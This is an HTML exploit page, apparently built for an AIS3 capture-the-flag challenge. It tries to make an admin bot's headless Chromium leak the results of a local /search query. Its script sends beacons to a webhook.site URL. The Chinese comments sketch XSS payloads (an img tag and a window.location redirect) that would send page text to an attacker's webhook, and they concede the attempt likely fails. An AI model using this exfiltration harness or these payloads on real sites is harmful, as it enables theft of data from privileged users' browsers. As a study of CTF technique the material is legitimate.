<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8">
    <title>Exploit Page - Location/Redirect Attempt</title>
</head>
<body>
    <p>Attempting Location/Redirect exfiltration... Check your webhook.</p>
    <script>
        const WEBHOOK_URL = "https://webhook.site/eed6e086-4677-4691-8515-ecf1b5559f63"; // <--- 替換成你的 Webhook URL
        const targetSearchURLBase = "http://127.0.0.1:5000/search";
        const searchQuery = "AIS3";

        async function sendToWebhook(label, data) {
            // ... (與上面相同的 sendToWebhook 函數)
            const payload = { timestamp: new Date().toISOString(), label: label, data: data };
            console.log(`Sending to webhook [${label}]:`, payload);
            try {
                await fetch(WEBHOOK_URL, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(payload),
                    mode: 'cors'
                });
            } catch (e) {
                console.error(`CRITICAL: Failed to send [${label}] to webhook:`, e);
                fetch(`${WEBHOOK_URL}?error_sending_label=${encodeURIComponent(label)}&error_msg=${encodeURIComponent(e.message)}`);
            }
        }

        sendToWebhook("exploit_v4_started", { message: "Location/Redirect attempt started." });

        // 這個方法的核心是，如果 search 的結果可以被構造成一個 URL，
        // 或者 q 參數有 XSS 可以注入 <script>window.location='...'</script>
        // 由於 /search 直接返回 JSON，這不太可能直接工作。

        // 嘗試：如果 search 結果為空，它會 redirect 到 "/"
        // 我們無法直接利用這個重定向來洩露 /search?q=AIS3 的結果。

        // 退而求其次，嘗試讓 admin bot 直接訪問一個包含 search 結果的 URL (如果可能)
        // 這需要 q 參數 XSS，注入類似：
        // <img src="YOUR_WEBHOOK_URL_HERE?data=" + encodeURIComponent(document.body.innerText) >
        // 或者 <script>window.location = 'YOUR_WEBHOOK_URL_HERE?data=' + encodeURIComponent(document.body.innerText)</script>
        // 這都依賴於 XSS。

        // 由於沒有明顯的 XSS，我們嘗試一個不同的思路：
        // 讓 chromium 訪問一個 URL，這個 URL 再去訪問 search，然後把結果放到 URL fragment 給我們
        // 這其實又回到了最初的 fetch 問題。

        // 最直接的 location 技巧是，如果目標頁面本身會基於內容進行重定向
        // 例如，如果 /search?q=<script>window.location='...'</script> 會執行
        // 但它返回 JSON，所以 <script> 不會被當作 HTML 標籤解析。

        // 備註：這個方案在當前情況下成功率極低，因為我們無法直接控制 /search 頁面的行為使其重定向並攜帶數據。
        // 我們能控制的是 headless chromium 訪問的初始 URL。

        try {
            // 嘗試讓 headless chromium 訪問一個 URL，這個 URL 嘗試加載 search 結果並將其作為 URL 的一部分
            // 但這又回到了 fetch 的 CORS 問題。
            // 如果只是簡單地導航到 search URL，數據不會自動發送到 webhook。
            // window.location = `${targetSearchURLBase}?q=${encodeURIComponent(searchQuery)}`; // 這只會讓瀏覽器導航，JS 執行會停止

            sendToWebhook("exploit_v4_no_direct_exploit", { message: "No obvious redirect/location trick applicable without XSS in q or server-side redirect control." });

        } catch (e) {
            sendToWebhook("exploit_v4_error", { errorName: e.name, errorMessage: e.message, errorStack: e.stack });
        }
        
        setTimeout(() => {
            sendToWebhook("exploit_v4_finished", { message: "Timeout reached." });
        }, 2000); // 縮短時間，因為這裡沒做太多異步操作

    </script>
</body>
</html>
